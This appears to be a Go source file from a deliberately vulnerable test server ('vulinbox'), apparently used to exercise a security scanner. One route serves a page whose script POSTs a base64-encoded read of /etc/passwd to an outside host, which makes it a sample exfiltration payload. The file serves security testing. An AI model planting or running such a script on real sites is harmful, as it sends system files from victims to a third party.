package vulinbox

import "net/http"

func (s *VulinServer) registerMiscRoute() {
	s.router.HandleFunc("/misc/mo", func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
		writer.Write([]byte(`<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("file={{base64enc(file(/etc/passwd))}}");
</script>`))
	})
}
